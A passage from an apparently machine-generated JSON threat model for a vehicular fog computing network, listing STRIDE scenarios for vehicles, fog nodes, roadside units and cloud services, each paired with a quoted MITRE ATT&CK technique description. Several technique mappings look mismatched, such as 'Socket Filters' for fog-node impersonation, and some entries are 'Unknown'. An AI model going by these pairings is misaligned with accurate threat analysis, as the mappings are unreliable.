                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An internal actor floods the system with bogus requests to the cloud services, causing slowdowns or outages.",
            "Assumptions": [
                {
                    "Assumption": "Internal network access lacks stringent monitoring and control.",
                    "Role": "System administrator",
                    "Condition": "Weak internal access controls."
                },
                {
                    "Assumption": "The attacker has legitimate access to the network.",
                    "Role": "Internal actor",
                    "Condition": "Insider knowledge and privileges."
                },
                {
                    "Assumption": "The cloud system is not resilient against high volumes of requests.",
                    "Role": "Cloud service provider",
                    "Condition": "Insufficient scalability or load handling."
                }
            ],
            "Potential Impact": "Degraded performance or downtime of cloud services affecting overall system functionality.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "internal threat",
                "request flooding",
                "cloud service"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker escalates privileges at a fog node to gain administrative access, allowing control over data and operations.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes have software vulnerabilities that permit privilege escalation.",
                    "Role": "System developer",
                    "Condition": "Unpatched or insecure code."
                },
                {
                    "Assumption": "The attacker has initial access to the fog node.",
                    "Role": "Attacker",
                    "Condition": "Compromised credentials or physical access."
                },
                {
                    "Assumption": "Access control mechanisms at the fog node are weak or misconfigured.",
                    "Role": "System administrator",
                    "Condition": "Lax access control policies."
                }
            ],
            "Potential Impact": "Full control over fog node operations, potentially leading to data manipulation or disruption.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "privilege escalation",
                "fog node",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--1959d63f-73fd-46a1-abd2-109d7dcede32",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses a compromised smart vehicle to gain elevated access within the VFC network.",
            "Assumptions": [
                {
                    "Assumption": "Smart vehicle systems contain flaws that permit privilege escalation.",
                    "Role": "Vehicle manufacturer",
                    "Condition": "Vulnerable or outdated software."
                },
                {
                    "Assumption": "The attacker can remotely access the vehicle network.",
                    "Role": "Attacker",
                    "Condition": "Remote access capabilities."
                },
                {
                    "Assumption": "Network segmentation and isolation are insufficient.",
                    "Role": "Network architect",
                    "Condition": "Poor network segmentation."
                }
            ],
            "Potential Impact": "Unauthorized network access and potential control over VFC operations.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "remote access",
                "network",
                "smart vehicle"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An employee with standard access uses social engineering to gain administrative privileges in the cloud service.",
            "Assumptions": [
                {
                    "Assumption": "Social engineering defenses are inadequate.",
                    "Role": "Security manager",
                    "Condition": "Lack of employee training and awareness."
                },
                {
                    "Assumption": "Administrative access controls are weak or bypassable.",
                    "Role": "Cloud administrator",
                    "Condition": "Poor access management policies."
                },
                {
                    "Assumption": "The attacker has sufficient insider knowledge.",
                    "Role": "Internal attacker",
                    "Condition": "Knowledge of internal processes and systems."
                }
            ],
            "Potential Impact": "Full administrative control over cloud services, risking data and operational integrity.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "social engineering",
                "administrative access",
                "cloud service"
            ],
            "mitre_technique": {
                "name": "Compromise Accounts",
                "description": "Adversaries may compromise accounts with services that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating accounts (i.e. [Establish Accounts](https://attack.mitre.org/techniques/T1585)), adversaries may compromise existing accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. \n\nA variety of methods exist for compromising accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials.(Citation: AnonHBGary)(Citation: Microsoft DEV-0537) Prior to compromising accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.\n\nPersonas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, etc.). Compromised accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.\n\nAdversaries may directly leverage compromised email accounts for [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).",
                "id": "attack-pattern--81033c3b-16a4-46e4-8fed-9b030dd03c4a",
                "technique_id": "T1586"
            }
        }
    ]
},
{
    "case_number": "11",
    "batch_number": "11",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs a smart vehicle to send false data to a fog node.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has hardware that can mimic a smart vehicle.",
                    "Role": "Attacker",
                    "Condition": "Hardware availability and understanding of communication protocols."
                },
                {
                    "Assumption": "The spoofed data can bypass any basic authentication checks.",
                    "Role": "System",
                    "Condition": "Lack of multi-layered authentication mechanisms in place."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive data, corruption of road condition data, potential disruption in traffic management.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Vehicle",
                "Fog Node",
                "Network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a fog node to send malicious commands to vehicles.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has compromised a fog node or can create a rogue one.",
                    "Role": "Attacker",
                    "Condition": "Compromised or misconfigured fog node."
                },
                {
                    "Assumption": "Vehicles do not have stringent authentication mechanisms for fog nodes.",
                    "Role": "System",
                    "Condition": "Lack of mutual authentication between vehicles and fog nodes."
                }
            ],
            "Potential Impact": "Potential vehicle malfunctions, accidents, and unauthorized data access.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Fog Node",
                "Command",
                "Vehicle"
            ],
            "mitre_technique": {
                "name": "Socket Filters",
                "description": "Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.\n\nTo establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria.(Citation: haking9 libpcap network sniffing) Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with [Protocol Tunneling](https://attack.mitre.org/techniques/T1572).(Citation: exatrack bpf filters passive backdoors)(Citation: Leonardo Turla Penquin May 2020)\n\nFilters can be installed on any Unix-like platform with `libpcap` installed or on Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER` options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.",
                "id": "attack-pattern--005cc321-08ce-4d17-b1ea-cb5275926520",
                "technique_id": "T1205.002"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs a roadside unit (RSU) to disrupt local traffic information.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can access and mimic an RSU's communication protocols.",
                    "Role": "Attacker",
                    "Condition": "Access to RSU communication channels."
                },
                {
                    "Assumption": "The spoofed RSU can send legitimate-looking data.",
                    "Role": "System",
                    "Condition": "Lack of encryption and authentication in RSU communication."
                }
            ],
            "Potential Impact": "Disruption of real-time traffic management, increased risk of road accidents.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "RSU",
                "Traffic",
                "Communication"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Tampering with data transmitting from vehicles to fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Data is not encrypted during transmission.",
                    "Role": "System",
                    "Condition": "Use of plaintext communication."
                },
                {
                    "Assumption": "The attacker has access to the network path between vehicle and fog node.",
                    "Role": "Attacker",
                    "Condition": "Physical or network access to communication channels."
                }
            ],
            "Potential Impact": "Corruption of vehicle data, misleading decisions by fog nodes, potentially dangerous road conditions.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Data Transmission",
                "Vehicle",
                "Fog Node"
            ],
            "mitre_technique": {
                "name": "Network Address Translation Traversal",
                "description": "Adversaries may bridge network boundaries by modifying a network device\u2019s Network Address Translation (NAT) configuration. Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.\n\nNetwork devices such as routers and firewalls that connect multiple networks together may implement NAT during the process of passing packets between networks. When performing NAT, the network device will rewrite the source and/or destination addresses of the IP address header. Some network designs require NAT for the packets to cross the border device.  A typical example of this is environments where internal networks make use of non-Internet routable addresses.(Citation: RFC1918)\n\nWhen an adversary gains control of a network boundary device, they can either leverage existing NAT configurations to send traffic between two separated networks, or they can implement NAT configurations of their own design.  In the case of network designs that require NAT to function, this enables the adversary to overcome inherent routing limitations that would normally prevent them from accessing protected systems behind the border device.  In the case of network designs that do not require NAT, address translation can be used by adversaries to obscure their activities, as changing the addresses of packets that traverse a network boundary device can make monitoring data transmissions more challenging for defenders.  \n\nAdversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001) to change the operating system of a network device, implementing their own custom NAT mechanisms to further obscure their activities",
                "id": "attack-pattern--4ffc1794-ec3b-45be-9e52-42dbcb2af2de",
                "technique_id": "T1599.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies data stored in fog nodes before transmission to the cloud.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has gained unauthorized access to a fog node.",
                    "Role": "Attacker",
                    "Condition": "Compromised fog node security."
                },
                {
                    "Assumption": "Data integrity mechanisms are not in place or are weak.",
                    "Role": "System",
                    "Condition": "Lack of or weak integrity checks."
                }
            ],
            "Potential Impact": "Integrity compromise of aggregated data, incorrect analysis, and predictions in cloud services.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Fog Node",
                "Cloud",
                "Data Integrity"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--modify-cloud-compute-infrastructure",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Injection of malicious data into the traffic management system via RSUs.",
            "Assumptions": [
                {
                    "Assumption": "RSUs have vulnerabilities that can be exploited.",
                    "Role": "Attacker",
                    "Condition": "Existing vulnerabilities in RSU."
                },
                {
                    "Assumption": "Injected data can influence real-time traffic decisions.",
                    "Role": "System",
                    "Condition": "Lack of validation checks on incoming data."
                }
            ],
            "Potential Impact": "Altered traffic management, potential creation of traffic jams, accidents.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "RSU",
                "Traffic Management",
                "Injection"
            ],
            "mitre_technique": {
                "name": "Content Injection",
                "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)\n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)\n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)",
                "id": "attack-pattern--43c9bc06-715b-42db-972f-52d25c09a20c",
                "technique_id": "T1659"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies sending forged data packets from vehicles.",
            "Assumptions": [
                {
                    "Assumption": "No non-repudiation mechanisms in data transmission protocols.",
                    "Role": "System",
                    "Condition": "Lack of digital signatures or similar mechanisms."
                },
                {
                    "Assumption": "Log management does not accurately capture sender information.",
                    "Role": "System",
                    "Condition": "Insufficient logging practices."
                }
            ],
            "Potential Impact": "Invalid attribution, difficulty in tracking malicious actions, compromise in forensic analysis.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Forgery",
                "Vehicle",
                "Data Packet"
            ],
            "mitre_technique": {
                "name": "Exploitation for Credential Access",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0\n\nCredentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.(Citation: Bugcrowd Replay Attack)(Citation: Comparitech Replay Attack)(Citation: Microsoft Midnight Blizzard Replay Attack)\n\nSuch exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.(Citation: Storm-0558 techniques for unauthorized email access)\n\nExploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",
                "id": "attack-pattern--9c306d8d-cde7-4b4c-b6e8-d0bb16caca36",
                "technique_id": "T1212"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A compromised fog node administrator denies unauthorized changes made to configuration.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient audit trails for configuration changes.",
                    "Role": "System",
                    "Condition": "Lack of comprehensive logging of administrative actions."
                },
                {
                    "Assumption": "Lack of proper access control for administrative actions.",
                    "Role": "System",
                    "Condition": "Weak or non-existent access controls."
                }
            ],
            "Potential Impact": "Difficulty in tracing configuration changes, potential for persistent security vulnerabilities.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Fog Node",
                "Configuration",
                "Audit Trail"
            ],
            "mitre_technique": {
                "name": "Data from Configuration Repository",
                "description": "Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.\n\nAdversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)",
                "id": "attack-pattern--0ad7bc5c-235a-4048-944b-3b286676cb74",
                "technique_id": "T1602"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Denial of malicious configuration updates on RSUs by insider threats.",
            "Assumptions": [
                {
                    "Assumption": "Logging mechanisms are not tamper-proof.",
                    "Role": "System",
                    "Condition": "Logs can be altered or deleted by insiders."
                },
                {
                    "Assumption": "Access controls do not sufficiently restrict privileged actions.",
                    "Role": "System",
                    "Condition": "Inadequate access control mechanisms."
                }
            ],
            "Potential Impact": "Untraceable malicious activities, sustained detrimental impacts on traffic systems.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Insider Threat",
                "RSU",
                "Configuration Update"
            ],
            "mitre_technique": {
                "name": "Impersonation",
                "description": "Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via [Phishing for Information](https://attack.mitre.org/techniques/T1598), [Phishing](https://attack.mitre.org/techniques/T1566), or [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary\u2019s ultimate goals, possibly against multiple victims. \n \nIn many cases of business email compromise or email fraud campaigns, adversaries use impersonation to defraud victims -- deceiving them into sending money or divulging information that ultimately enables [Financial Theft](https://attack.mitre.org/techniques/T1657).\n\nAdversaries will often also use social engineering techniques such as manipulative and persuasive language in email subject lines and body text such as `payment`, `request`, or `urgent` to push the victim to act quickly before malicious activity is detected. These campaigns are often specifically targeted against people who, due to job roles and/or accesses, can carry out the adversary\u2019s goal.\u202f\u202f \n \nImpersonation is typically preceded by reconnaissance techniques such as [Gather Victim Identity Information](https://attack.mitre.org/techniques/T1589) and [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591) as well as acquiring infrastructure such as email domains (i.e. [Domains](https://attack.mitre.org/techniques/T1583/001)) to substantiate their false identity.(Citation: CrowdStrike-BEC)\n \nThere is the potential for multiple victims in campaigns involving impersonation. For example, an adversary may [Compromise Accounts](https://attack.mitre.org/techniques/T1586) targeting one organization which can then be used to support impersonation against other entities.(Citation: VEC)",
                "id": "attack-pattern--c9e0c59e-162e-40a4-b8b1-78fab4329ada",
                "technique_id": "T1656"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Eavesdropping on communication between smart vehicles and fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels lack encryption.",
                    "Role": "System",
                    "Condition": "Use of unencrypted communication protocols."
                },
                {
                    "Assumption": "The attacker has the capability to intercept communication.",
                    "Role": "Attacker",
                    "Condition": "Access to the communication link between vehicles and fog nodes."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive vehicle and road condition data.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Eavesdropping",
                "Vehicle",
                "Fog Node",
                "Communication"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Exposure of sensitive data stored on fog nodes due to insufficient access controls.",
            "Assumptions": [
                {
                    "Assumption": "No strong access control mechanisms for data storage.",
                    "Role": "System",
                    "Condition": "Lack of proper access controls and permissions."
                },
                {
                    "Assumption": "Attacker has or gains physical or network access to the fog node.",
                    "Role": "Attacker",
                    "Condition": "Compromised fog node security or physical access."
                }
            ],
            "Potential Impact": "Unauthorized access and potential leakage of sensitive data.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Fog Node",
                "Sensitive Data",
                "Access Control"
            ],
            "mitre_technique": {
                "name": "Windows File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nWindows implements file and directory ACLs as Discretionary Access Control Lists (DACLs).(Citation: Microsoft DACL May 2018) Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.(Citation: Microsoft Access Control Lists May 2018)\n\nAdversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further, [PowerShell](https://attack.mitre.org/techniques/T1059/001) provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).",
                "id": "attack-pattern--34e793de-0274-4982-9c1a-246ed1c19dee",
                "technique_id": "T1222.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Misconfiguration in cloud data storage leading to unintended data exposure.",
            "Assumptions": [
                {
                    "Assumption": "Incorrect configuration settings during cloud service setup.",
                    "Role": "System",
                    "Condition": "Human error or lack of configuration guidelines."
                },
                {
                    "Assumption": "No regular audits and checks on cloud configurations.",
                    "Role": "System",
                    "Condition": "Lack of routine cloud security audits."
                }
            ],
            "Potential Impact": "Exposure of aggregated and processed data, privacy violations.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Cloud Storage",
                "Misconfiguration",
                "Data Exposure"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
